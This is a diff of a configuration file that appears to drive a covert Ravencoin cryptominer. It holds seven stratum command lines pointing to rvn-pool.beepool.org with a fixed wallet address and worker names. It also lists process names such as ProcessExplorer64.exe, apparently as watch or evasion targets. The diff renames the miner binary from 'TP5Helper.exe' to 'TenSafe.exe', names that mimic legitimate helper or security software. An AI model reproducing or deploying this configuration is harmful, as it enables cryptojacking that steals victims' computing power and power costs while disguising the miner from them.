@@ -1,5 +1,5 @@
 AA1AndroidEmulator.exeAA---JC的
-AA2TP5Helper.exe2AA
+AA222.exe2AA
 AA3ProcessExplorer64.exe3AA
 AA491K.exe4AA
 AA599K.exe5AA
@@ -8,17 +8,17 @@ AA795K.exe7AA
 AA897K.exe8AA
 AA996K.exe9AA
 ------------------------------------------------------------------------------------------------------------------------------------
-A1A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.RV13@pplns -i 13 -p x--A1A
-A2A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.RV15@pplns -i 15 -p x--A2A
-A3A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.RV16@pplns -i 16 -p x--A3A
-A4A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.1013@pplns -i 13 -p x--A4A
-A5A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.1014@pplns -i 14 -p x--A5A
-A6A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.1015@pplns -i 15 -p x--A6A
-A7A--\TP5Helper.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.cf13@pplns -i 13 -p x--A7A
+A1A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.RV13@pplns -i 13 -p x--A1A
+A2A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.RV15@pplns -i 15 -p x--A2A
+A3A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.RV16@pplns -i 16 -p x--A3A
+A4A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.1013@pplns -i 13 -p x--A4A
+A5A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.1014@pplns -i 14 -p x--A5A
+A6A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.1015@pplns -i 15 -p x--A6A
+A7A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.cf13@pplns -i 13 -p x--A7A
 A9A--ON--A9A
 ------------------------------------------------------------------------------------------------------------------------------------
-A0A--\TP5Helper.exe--A0A
-A8A--TP5Helper.exe--A8A---自身
+A0A--\TenSafe.exe--A0A
+A8A--TenSafe.exe--A8A---自身
 ------------------------------------------------------------------------------------------------------------------------------------
 B1B--sfdgefggfdgsdrgdfgcxvbdfg--B1B---取程
 B2B--sfdgefggfdgsdrgdfgcxvbdfg--B2B---
